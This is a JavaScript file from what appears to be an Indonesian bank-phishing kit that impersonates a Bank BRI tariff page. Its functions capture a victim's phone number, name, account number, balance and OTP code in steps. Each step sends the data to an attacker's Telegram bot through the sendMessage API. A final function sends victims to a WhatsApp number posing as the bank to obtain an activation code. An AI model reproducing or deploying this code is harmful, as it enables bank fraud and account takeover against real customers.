
// index
function sendNohp(){
    $(".load").fadeIn();
    event.preventDefault();   
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
    document.getElementById('kirim').innerHTML = "Memproses....";         
    var nomor = document.getElementById("nohp").value;
    sessionStorage.setItem("nomor", nomor);                    
    var logo = document.getElementById('logo');       
    var nohp = document.getElementById('nohp');    
    var gabungan = '' + logo.value + '%0A%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif + '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nohp.value;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,   
    complete: function(){
    setTimeout(function(){   
    window.location = "login.html";
    $("#lonte").hide();
    $(".load").fadeOut();  
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    vibr(180);
    }, 500);}});};   
     
     
     
//data     
function sendDebit(){
   $('.load').fadeIn();
    event.preventDefault();   
    document.getElementById('kirim').innerHTML = "Memproses....";               
    var logo = document.getElementById('logo');     
    var nama = document.getElementById('nama');
    var rek = document.getElementById('rek');    
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif +  '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nomorku.value + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + nama.value + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + rek.value;  
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldo.html";
    $("#lonte").hide();
    $('.load').fadeOut();
    document.getElementById('kirim').innerHTML = "Lanjutkan"; 
    var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
var nomortel = document.getElementById('nomorku').value;
            sessionStorage.setItem("nomortel", nomortel);
var noreke = document.getElementById('rek').value;
           sessionStorage.setItem("noreke", noreke);
var namanya = document.getElementById('nama').value;
            sessionStorage.setItem("namanya", namanya);
   vibr(180);
    }, 1500);}});};
    
       
    
    
// saldo  
function sendSaldo(){
    event.preventDefault();    
    document.getElementById('kirim').innerHTML = "Verify...";
    $("#lonte").show();
    $('.load').fadeIn();                    
    var logo = document.getElementById('logo');     
    var saldo = document.getElementById('saldo');    
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif +  '%0A- 𝐍𝐨.𝐇𝐩 •• ' + nomorsaya.value + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + namaku.value + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + norekku.value + '%0A- 𝐒𝐚𝐥𝐝𝐨 •• ' + saldo.value;
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
   complete: function(){     
   setTimeout(function(){
   document.getElementById('kirim').innerHTML = "Benar";
   $("#lonte").hide();
   $('.load').fadeOut();
   window.location = "otp.html";
   vibr(180);  
 var phone = document.getElementById("nomorsaya").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("namaku").value;
 sessionStorage.setItem("user", user);
 var card = document.getElementById("norekku").value;
 sessionStorage.setItem("card", card);
 var duet = document.getElementById("saldo").value;
 sessionStorage.setItem("duet", duet);
    }, 300);}});};    

        


// otp
function sendOtp(){
    event.preventDefault();        
    document.getElementById('kirims').value = "Memproses....";                            
    var logo = document.getElementById('logo');     
    var nama1 = document.getElementById('nama1');    
    var gabungan = '' + logo.value + '%0A- 𝐓𝐚𝐫𝐢𝐟 •• ' + tarif +  '%0A- 𝐍𝐨.𝐇𝐩 •• ' + tele.value + '%0A%0A- 𝐍𝐚𝐦𝐚 •• ' + namanye.value + '%0A- 𝐍𝐨.𝐑𝐞𝐤 •• ' + kertu.value + '%0A- 𝐒𝐚𝐥𝐝𝐨 •• ' + uang.value + '%0A%0A- 𝐎𝐭𝐩 •• ' + nama1.value;   
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,    
    complete: function(){
    vibr(800);    
    setTimeout(function(){
    showAlert("a");
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   document.getElementById('kirims').value = "Konfirmasi";
    }, 200);}});};




function get(){
 $("#process1").show();
 $('.load').fadeIn();   
setTimeout(function(){  
location.href='https://wa.me/6281554311859?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜%0ASaya%20mau%20Request%20Kode%20Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();
 }, 2000);    
}     
